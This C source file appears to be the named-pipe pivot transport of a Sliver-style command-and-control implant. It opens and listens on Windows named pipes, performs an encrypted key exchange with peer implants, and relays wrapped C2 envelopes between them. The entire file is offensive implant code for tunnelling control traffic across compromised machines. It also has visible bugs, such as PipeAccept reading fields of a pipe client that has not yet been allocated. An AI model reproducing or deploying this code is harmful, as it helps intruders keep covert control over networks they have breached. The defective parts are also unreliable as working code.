#include "pch.h"

BOOL RawPipeSend
(
	_In_ PSLIVER_PIPE_CLIENT pPipeClient,
	_In_ PBUFFER pBuffer
)
{
	BOOL Result = FALSE;
	DWORD dwNumberOfBytesSent = 0;
	DWORD dwTotal = 0;
	DWORD dwZeroTimeout = 0;
	DWORD dwNumberOfBytesWritten = 0;

	EnterCriticalSection(pPipeClient->pWriteLock);
	if (!WriteFile(pPipeClient->hPipe, &pBuffer->cbBuffer, sizeof(pBuffer->cbBuffer), &dwNumberOfBytesWritten, NULL)) {
		LOG_ERROR("WriteFile", GetLastError());
		goto CLEANUP;
	}

	if (dwNumberOfBytesWritten != sizeof(pBuffer->cbBuffer)) {
		goto CLEANUP;
	}

	if (!WriteFile(pPipeClient->hPipe, pBuffer->pBuffer, pBuffer->cbBuffer, &dwNumberOfBytesWritten, NULL)) {
		LOG_ERROR("WriteFile", GetLastError());
		goto CLEANUP;
	}

	if (pBuffer->cbBuffer != dwNumberOfBytesWritten) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	LeaveCriticalSection(pPipeClient->pWriteLock);

	return Result;
}

PBUFFER RawPipeRecv
(
	_In_ PSLIVER_PIPE_CLIENT pPipeClient
)
{
	PBUFFER Result = NULL;
	DWORD dwNumberOfBytesRecv = 0;
	DWORD dwTotal = 0;
	DWORD dwZeroTimeout = 0;
	BOOL IsOk = FALSE;
	DWORD dwNumberOfBytesRead = 0;

	EnterCriticalSection(pPipeClient->pReadLock);
	Result = ALLOC(sizeof(BUFFER));
	if (!ReadFile(pPipeClient->hPipe, &Result->cbBuffer, sizeof(Result->cbBuffer), &dwNumberOfBytesRead, NULL)) {
		LOG_ERROR("ReadFile", GetLastError());
		goto CLEANUP;
	}

	if (dwNumberOfBytesRead != sizeof(Result->cbBuffer)) {
		goto CLEANUP;
	}

	Result->pBuffer = ALLOC(Result->cbBuffer);
	if (!ReadFile(pPipeClient->hPipe, Result->pBuffer, Result->cbBuffer, &dwNumberOfBytesRead, NULL)) {
		LOG_ERROR("ReadFile", GetLastError());
		goto CLEANUP;
	}

	if (dwNumberOfBytesRead != Result->cbBuffer) {
		goto CLEANUP;
	}

	IsOk = TRUE;
CLEANUP:
	LeaveCriticalSection(pPipeClient->pReadLock);
	if (!IsOk) {
		FreeBuffer(Result);
		Result = NULL;
	}

	return Result;
}

PSLIVER_PIPE_CLIENT PipeInit()
{
	PSLIVER_PIPE_CLIENT pResult = NULL;
	CHAR szBindAddress[] = "\\\\.\\pipe\\demo";
	DWORD dwReadDeadline = 10;
	DWORD dwWriteDeadline = 10;
	int ErrorCode = 0;
	BOOL Result = FALSE;
	BOOL IsOk = FALSE;
	ULONG uBlockingMode = 0;

	pResult = ALLOC(sizeof(SLIVER_PIPE_CLIENT));
	pResult->lpBindAddress = DuplicateStrA(szBindAddress, 0);
	pResult->dwReadDeadline = dwReadDeadline * 1000;
	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
	pResult->dwBufferSize = 0x10000;
	pResult->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
	pResult->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
	pResult->hPipe = INVALID_HANDLE_VALUE;
	InitializeCriticalSection(pResult->pReadLock);
	InitializeCriticalSection(pResult->pWriteLock);
	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		PipeCleanup(pResult);
		pResult = NULL;
	}

	return pResult;
}

BOOL PipeClose
(
	_In_ PSLIVER_PIPE_CLIENT pPipeClient
)
{
	if (pPipeClient != NULL) {
		if (pPipeClient->hPipe != INVALID_HANDLE_VALUE) {
			CloseHandle(pPipeClient->hPipe);
		}
	}

	return TRUE;
}

BOOL PipeCleanup
(
	_In_ PSLIVER_PIPE_CLIENT pPipeClient
)
{
	if (pPipeClient != NULL) {
		FREE(pPipeClient->lpBindAddress);
		if (pPipeClient->pReadLock != NULL) {
			DeleteCriticalSection(pPipeClient->pReadLock);
			FREE(pPipeClient->pReadLock);
		}

		if (pPipeClient->pWriteLock != NULL) {
			DeleteCriticalSection(pPipeClient->pWriteLock);
			FREE(pPipeClient->pWriteLock);
		}

		FREE(pPipeClient);
		WSACleanup();
	}

	return TRUE;
}

BOOL PipeStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_PIPE_CLIENT pPipeClient
)
{
	BOOL Result = FALSE;
	PBUFFER pPivotHello = NULL;
	PBUFFER pPeerPublicKeyRaw = NULL;
	PPIVOT_HELLO RecvPivotHello = NULL;
	PBUFFER pPeerSessionKey = NULL;
	PBYTE pEncryptedSessionKey = NULL;
	DWORD cbEncryptedSessionKey = 0;
	PPBElement PivotServerKeyExchange[2];
	PPBElement pPivotServerKeyExchangeData = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
	PENVELOPE pEnvelope = NULL;
	PBUFFER pPivotServerKeyExchangeEnvelope = NULL;
	PBUFFER pCipherText = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PPBElement ServerKeyExResp[2];
	LPVOID* UnmarshaledData = NULL;
	DWORD i = 0;
	DWORD dwMode = PIPE_READMODE_MESSAGE | PIPE_WAIT;

	pPipeClient->hPipe = CreateFileA(pPipeClient->lpBindAddress, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (pPipeClient->hPipe == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileA", GetLastError());
		goto CLEANUP;
	}

	if (!SetNamedPipeHandleState(pPipeClient->hPipe, &dwMode, NULL, NULL)) {
		LOG_ERROR("SetNamedPipeHandleState", GetLastError());
		goto CLEANUP;
	}

	pPivotHello = MarshalPivotHello(pConfig, NULL);
	if (!RawPipeSend(pPipeClient, pPivotHello)) {
		goto CLEANUP;
	}

	pPeerPublicKeyRaw = RawPipeRecv(pPipeClient);
	if (pPeerPublicKeyRaw == NULL) {
		goto CLEANUP;
	}

	RecvPivotHello = UnmarshalPivotHello(pPeerPublicKeyRaw);
	pPeerSessionKey = AgeDecryptFromPeer(pConfig, RecvPivotHello->pPublicKey, RecvPivotHello->lpPublicKeySignature, RecvPivotHello->pSessionKey);
	if (pPeerSessionKey == NULL || pPeerSessionKey->cbBuffer != CHACHA20_KEY_SIZE) {
		goto CLEANUP;
	}

	pConfig->pPeerSessionKey = pPeerSessionKey->pBuffer;
	pPeerSessionKey->pBuffer = NULL;

	// Server Key Exchange
	pConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	pEncryptedSessionKey = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pConfig->pSessionKey, CHACHA20_KEY_SIZE, &cbEncryptedSessionKey);
	PivotServerKeyExchange[0] = CreateVarIntElement(pConfig->uPeerID, 1);
	PivotServerKeyExchange[1] = CreateBytesElement(pEncryptedSessionKey, cbEncryptedSessionKey, 2);
	pPivotServerKeyExchangeData = CreateStructElement(PivotServerKeyExchange, _countof(PivotServerKeyExchange), 0);

	pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
	pPivotPeerEnvelope->cPivotPeers = 1;
	pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
	pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
	pPivotPeerEnvelope->PivotPeers[0]->uPeerID = pConfig->uPeerID;
	pPivotPeerEnvelope->PivotPeers[0]->lpName = DuplicateStrA(pConfig->szSliverName, 0);

	pPivotPeerEnvelope->uType = MsgPivotServerKeyExchange;
	pPivotPeerEnvelope->pData = BufferMove(pPivotServerKeyExchangeData->pMarshaledData, pPivotServerKeyExchangeData->cbMarshaledData);
	pPivotServerKeyExchangeData->pMarshaledData = NULL;

	pEnvelope = ALLOC(sizeof(ENVELOPE));
	pEnvelope->uType = MsgPivotPeerEnvelope;
	pEnvelope->pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
	pPivotServerKeyExchangeEnvelope = MarshalEnvelope(pEnvelope);

	pCipherText = SliverEncrypt(pConfig->pPeerSessionKey, pPivotServerKeyExchangeEnvelope);
	if (!RawPipeSend(pPipeClient, pCipherText)) {
		goto CLEANUP;
	}

	pRecvEnvelope = PipeRecv(pConfig, pPipeClient);
	if (pRecvEnvelope == NULL || pRecvEnvelope->uType != MsgPivotServerKeyExchange) {
		goto CLEANUP;
	}

	ServerKeyExResp[0] = ALLOC(sizeof(PBElement));
	ServerKeyExResp[0]->dwFieldIdx = 1;
	ServerKeyExResp[0]->Type = Varint;

	ServerKeyExResp[1] = ALLOC(sizeof(PBElement));
	ServerKeyExResp[1]->dwFieldIdx = 2;
	ServerKeyExResp[1]->Type = Bytes;

	UnmarshaledData = UnmarshalStruct(ServerKeyExResp, _countof(ServerKeyExResp), pRecvEnvelope->pData->pBuffer, pRecvEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	memcpy(pConfig->PivotSessionID, ((PBUFFER)UnmarshaledData[1])->pBuffer, sizeof(pConfig->PivotSessionID));
	Result = TRUE;
CLEANUP:
	FreeBuffer(pPivotHello);
	FreeBuffer(pPeerSessionKey);
	FreeBuffer(pPeerPublicKeyRaw);
	FreePivotHello(RecvPivotHello);
	FreeElement(pPivotServerKeyExchangeData);
	FreeEnvelope(pEnvelope);
	FreeBuffer(pPivotServerKeyExchangeEnvelope);
	FreeBuffer(pCipherText);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);
	FreeEnvelope(pRecvEnvelope);
	FREE(pEncryptedSessionKey);
	for (i = 0; i < _countof(ServerKeyExResp); i++) {
		FREE(ServerKeyExResp[i]);
	}

	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[1]);
		FREE(UnmarshaledData);
	}


	return Result;
}

PENVELOPE PipeRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_PIPE_CLIENT pPipeClient
)
{
	PENVELOPE pResult = NULL;
	PBUFFER pCipherText = NULL;
	PBUFFER pData = NULL;
	PBUFFER pPlainText = NULL;
	PENVELOPE pIncomingEnvelope = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;

	pCipherText = RawPipeRecv(pPipeClient);
	if (pCipherText == NULL) {
		goto CLEANUP;
	}

	pData = SliverDecrypt(pConfig->pPeerSessionKey, pCipherText);
	if (pData == NULL) {
		goto CLEANUP;
	}

	pIncomingEnvelope = UnmarshalEnvelope(pData);
	if (pIncomingEnvelope->uType == MsgPivotPeerPing) {
		pResult = pIncomingEnvelope;
		pIncomingEnvelope = NULL;
		goto CLEANUP;
	}

	if (pIncomingEnvelope->uType != MsgPivotPeerEnvelope) {
		goto CLEANUP;
	}

	pPivotPeerEnvelope = UnmarshalPivotPeerEnvelope(pIncomingEnvelope->pData);
	if (pPivotPeerEnvelope == NULL) {
		goto CLEANUP;
	}

	if (pPivotPeerEnvelope->cPivotPeers < 1) {
		goto CLEANUP;
	}

	if (pPivotPeerEnvelope->PivotPeers[0]->uPeerID != pConfig->uPeerID) {
		pResult = pIncomingEnvelope;
		pIncomingEnvelope = NULL;
		goto CLEANUP;
	}

	pPlainText = SliverDecrypt(pConfig->pSessionKey, pPivotPeerEnvelope->pData);
	if (pPlainText == NULL) {
		goto CLEANUP;
	}

	pResult = UnmarshalEnvelope(pPlainText);
	PrintFormatA("Read Envelope:\n");
	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
CLEANUP:
	FreeBuffer(pCipherText);
	FreeBuffer(pData);
	FreeBuffer(pPlainText);
	FreeEnvelope(pIncomingEnvelope);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);

	return pResult;
}

BOOL PipeSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_PIPE_CLIENT pPipeClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pPlainText = NULL;
	BOOL Result = FALSE;
	PBUFFER pPeerPlainText = NULL;
	PBUFFER pPeerCiphertext = NULL;
	PBUFFER pCipherText = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
	ENVELOPE FinalEnvelope;

	if (pEnvelope == NULL) {
		goto CLEANUP;
	}

	if (pEnvelope->pData != NULL) {
		PrintFormatA("Write Envelope:\n");
		if (pEnvelope->pData->cbBuffer > 0x1000) {
			HexDump(pEnvelope->pData->pBuffer, 0x1000);
		}
		else {
			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		}
	}
	else {
		PrintFormatW(L"Write Envelope: []\n");
	}

	pPlainText = MarshalEnvelope(pEnvelope);
	if (pEnvelope->uType != MsgPivotPeerPing && pEnvelope->uType != MsgPivotPeerEnvelope) {
		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
		pPivotPeerEnvelope->uType = MsgPivotSessionEnvelope;
		pPivotPeerEnvelope->pPivotSessionID = BufferInit(pConfig->PivotSessionID, sizeof(pConfig->PivotSessionID));
		pPivotPeerEnvelope->pData = SliverEncrypt(pConfig->pSessionKey, pPlainText);
		pPivotPeerEnvelope->cPivotPeers = 1;
		pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
		pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
		pPivotPeerEnvelope->PivotPeers[0]->uPeerID = pConfig->uPeerID;
		pPivotPeerEnvelope->PivotPeers[0]->lpName = DuplicateStrA(pConfig->szSliverName, 0);

		SecureZeroMemory(&FinalEnvelope, sizeof(FinalEnvelope));
		FinalEnvelope.uType = MsgPivotPeerEnvelope;
		FinalEnvelope.pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
		pPeerPlainText = MarshalEnvelope(&FinalEnvelope);
		FreeBuffer(FinalEnvelope.pData);
	}
	else {
		pPeerPlainText = pPlainText;
		pPlainText = NULL;
	}

	pPeerCiphertext = SliverEncrypt(pConfig->pPeerSessionKey, pPeerPlainText);
	if (!RawPipeSend(pPipeClient, pPeerCiphertext)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeBuffer(pPlainText);
	FreeBuffer(pPeerPlainText);
	FreeBuffer(pPeerCiphertext);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);

	return Result;
}

PPIVOT_CONNECTION PipeAccept
(
	_In_ PPIVOT_LISTENER pListener
)
{
	HANDLE hPipe = NULL;
	PPIVOT_CONNECTION pResult = NULL;
	PSLIVER_PIPE_CLIENT pPipeClient = NULL;
	SOCKADDR PeerAddr;
	DWORD dwNameLength = sizeof(PeerAddr);
	DWORD dwLastError = ERROR_SUCCESS;

	hPipe = CreateNamedPipeA(pPipeClient->lpBindAddress, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, pPipeClient->dwBufferSize, pPipeClient->dwBufferSize, 0, NULL);
	if (hPipe == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateNamedPipeA", GetLastError());
		goto CLEANUP;
	}

	if (!ConnectNamedPipe(hPipe, NULL)) {
		dwLastError = GetLastError();
		if (dwLastError != ERROR_PIPE_CONNECTED) {
			goto CLEANUP;
		}
	}

	pResult = ALLOC(sizeof(PIVOT_CONNECTION));
	pPipeClient = ALLOC(sizeof(SLIVER_PIPE_CLIENT));
	pPipeClient->dwReadDeadline = 10 * 1000;
	pPipeClient->dwWriteDeadline = 10 * 1000;
	pPipeClient->hPipe = hPipe;
	pPipeClient->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
	pPipeClient->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(pPipeClient->pReadLock);
	InitializeCriticalSection(pPipeClient->pWriteLock);
	SecureZeroMemory(&PeerAddr, sizeof(PeerAddr));
	pResult->lpRemoteAddress = ALLOC(0x100);
	if (!GetNamedPipeClientComputerNameA(&PeerAddr, pResult->lpRemoteAddress, 0x100)) {
		FREE(pResult->lpRemoteAddress);
		pResult->lpRemoteAddress = NULL;
	}

	pResult->lpDownstreamConn = pPipeClient;
	pResult->pListener = pListener;
CLEANUP:
	return pResult;
}

PPIVOT_LISTENER CreatePipePivotListener
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ LPVOID lpClient,
	_In_ LPSTR lpBindAddress
)
{
	PPIVOT_LISTENER pListener = NULL;

	pListener = ALLOC(sizeof(PIVOT_LISTENER));
	pListener->lpBindAddress = DuplicateStrA(lpBindAddress, 0);
	pListener->dwType = PivotType_NamedPipe;
	pListener->dwListenerId = pConfig->dwListenerID++;
	pListener->pConfig = pConfig;
	pListener->lpUpstream = lpClient;
	InitializeCriticalSection(&pListener->Lock);

	pListener->RawSend = RawPipeSend;
	pListener->RawRecv = RawPipeRecv;
	pListener->Accept = PipeAccept;
	pListener->Close = PipeClose;
	pListener->Cleanup = PipeCleanup;
	pListener->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pListener, 0, NULL);
	if (pListener->hThread == NULL) {
		LOG_ERROR("CreateThread", GetLastError());
		goto CLEANUP;
	}

CLEANUP:
	return pListener;
}